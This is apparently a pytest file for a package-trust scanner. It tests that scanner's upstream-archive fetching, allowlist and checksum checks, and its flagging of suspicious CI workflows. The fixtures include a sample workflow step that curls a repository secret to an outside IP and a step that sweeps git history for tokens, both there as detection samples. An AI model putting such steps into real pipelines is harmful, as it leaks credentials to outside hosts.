"""Collecting upstream manifests into the U-series state (off by default)."""

from __future__ import annotations

import hashlib

import pytest

from trustsight.upstream_collect import collect_upstream_manifest_texts


@pytest.fixture(autouse=True)
def _online_lane(monkeypatch):
    """These tests inject their own fetcher; opt back into the online path."""
    monkeypatch.delenv("TRUSTSIGHT_OFFLINE", raising=False)

DATA = b"archive-bytes"
SHA256 = hashlib.sha256(DATA).hexdigest()

RECIPE = (
    "pkgname=demo\n"
    "pkgver=1.0\n"
    'source=("https://github.com/owner/repo/archive/refs/tags/v${pkgver}.tar.gz")\n'
    f"sha256sums=('{SHA256}')\n"
)

CONFIG = {"upstream_scan": {
    "enabled": True,
    "allowed_hosts": ["github.com"],
    "archive_fetch": True,
    "min_checksum_bits": 256,
    "deadline_seconds": 5,
}}


def _extractor(_slug, _data):
    return {"manifest_texts": [("pkg/Cargo.toml", "[package]\nname='x'\n")],
            "complete": True, "refused": False, "malformed": False}


def test_disabled_lane_collects_nothing():
    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config={"upstream_scan": {"enabled": False}})
    assert texts == [] and notes == [] and findings == []


def test_enabled_lane_fetches_verifies_and_extracts():
    calls = []

    def fetcher(url, target):
        calls.append((url, target.slug))
        return DATA

    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG, fetcher=fetcher, extractor=_extractor)
    assert texts == [("upstream/pkg/Cargo.toml", "[package]\nname='x'\n")]
    assert notes == []
    assert calls and calls[0][1] == "github.com/owner/repo"


def test_a_checksum_mismatch_is_a_boundary_not_a_parse():
    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG, fetcher=lambda url, target: b"different",
        extractor=_extractor)
    assert texts == []
    assert "upstream_scan_checksum" in notes


def test_an_off_allowlist_source_is_never_fetched():
    recipe = RECIPE.replace("https://github.com", "https://evil.example")
    called = []

    def fetcher(url, target):
        called.append(url)
        return DATA

    texts, notes, findings, verified = collect_upstream_manifest_texts(
        recipe, config=CONFIG, fetcher=fetcher, extractor=_extractor)
    assert texts == [] and notes == [] and findings == []
    assert called == []


def test_archive_fetch_must_be_enabled():
    config = dict(CONFIG)
    config["upstream_scan"] = dict(CONFIG["upstream_scan"], archive_fetch=False)
    called = []
    texts, _, _, _ = collect_upstream_manifest_texts(
        RECIPE, config=config,
        fetcher=lambda url, target: called.append(url) or DATA,
        extractor=_extractor)
    assert texts == [] and called == []


def test_a_weak_checksum_is_never_an_archive_anchor():
    weak = RECIPE.replace("sha256sums", "md5sums").replace(SHA256, "0" * 32)
    called = []
    texts, _, _, _ = collect_upstream_manifest_texts(
        weak, config=CONFIG,
        fetcher=lambda url, target: called.append(url) or DATA,
        extractor=_extractor)
    assert texts == [] and called == []


def test_the_total_manifest_text_is_capped():
    def extractor(_slug, _data):
        return {"manifest_texts": [
            (f"pkg/m{i}.toml", "x" * (64 * 1024)) for i in range(80)],
            "complete": True, "refused": False, "malformed": False}

    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG, fetcher=lambda url, target: DATA,
        extractor=extractor)
    assert sum(len(text) for _, text in texts) <= 2 * 1024 * 1024
    assert "upstream_scan_partial" in notes


def test_offline_never_opens_a_connection(monkeypatch):
    monkeypatch.setenv("TRUSTSIGHT_OFFLINE", "1")
    called = []
    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG,
        fetcher=lambda url, target: called.append(url) or DATA,
        extractor=_extractor)
    assert texts == []
    assert notes == ["upstream_scan_offline"]
    assert called == []


def test_local_ci_exfil_shape_is_reported_report_only():
    def extractor(_slug, _data):
        text = (
            "on: push\n"
            "jobs:\n  x:\n    steps:\n"
            "      - run: |\n"
            "          curl -X POST https://198.51.100.9/collect "
            "-d \"${{ secrets.TOKEN }}\"\n"
        )
        return {"manifest_texts": [("pkg/.github/workflows/ci.yml", text)],
                "complete": True, "refused": False, "malformed": False}

    texts, notes, findings, verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG, fetcher=lambda url, target: DATA,
        extractor=extractor)
    assert notes == []
    ids = {f["rule_id"] for f in findings}
    assert "U013" in ids
    assert all(f.get("weight_override") == 0 for f in findings)


def test_local_history_sweep_shape_is_reported_report_only():
    def extractor(_slug, _data):
        text = (
            "on: push\njobs:\n  x:\n    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n          fetch-depth: 0\n"
            "      - run: git log -p | grep -Ei 'token|secret'\n"
        )
        return {"manifest_texts": [("pkg/.github/workflows/ci.yml", text)],
                "complete": True, "refused": False, "malformed": False}

    _texts, _notes, findings, _verified = collect_upstream_manifest_texts(
        RECIPE, config=CONFIG, fetcher=lambda url, target: DATA,
        extractor=extractor)
    assert "U014" in {f["rule_id"] for f in findings}


def test_upstream_findings_reach_the_fact_at_weight_zero():
    from trustsight.config import ensure_default_configs
    from trustsight.db import init_db
    from trustsight.findings import stamp
    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text

    ensure_default_configs()
    init_db()
    finding = stamp({
        "rule_id": "U013",
        "name": "CI Exfil Shape (Local)",
        "severity": "MEDIUM",
        "category": "upstream-ci",
        "match": "a workflow pairs a secret with an outbound transfer",
        "file": "upstream/.github/workflows/ci.yml",
        "line": None,
        "weight_override": 0,
    })
    args = ("demo", "pkgname=demo\npkgver=1\n", "pkgname=demo\npkgver=1\n",
            "tester", TemporalContext())
    base = analyze_package_text(*args)
    with_finding = analyze_package_text(*args, upstream_findings=[finding])
    ids = {e.rule_id for e in with_finding.score_breakdown}
    assert "U013" in ids
    entry = next(e for e in with_finding.score_breakdown if e.rule_id == "U013")
    assert entry.weight == 0
    assert (sum(e.weight for e in with_finding.score_breakdown)
            == sum(e.weight for e in base.score_breakdown))


def test_scan_notes_reach_the_fact_as_a_weight_zero_boundary():
    from trustsight.config import ensure_default_configs
    from trustsight.db import init_db
    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text

    ensure_default_configs()
    init_db()
    fact = analyze_package_text(
        "demo", "pkgname=demo\npkgver=1\n", "pkgname=demo\npkgver=1\n",
        "tester", TemporalContext(),
        upstream_scan_notes=["upstream_scan_checksum"],
    )
    entry = next(e for e in fact.score_breakdown if e.rule_id == "W014")
    assert entry.weight == 0
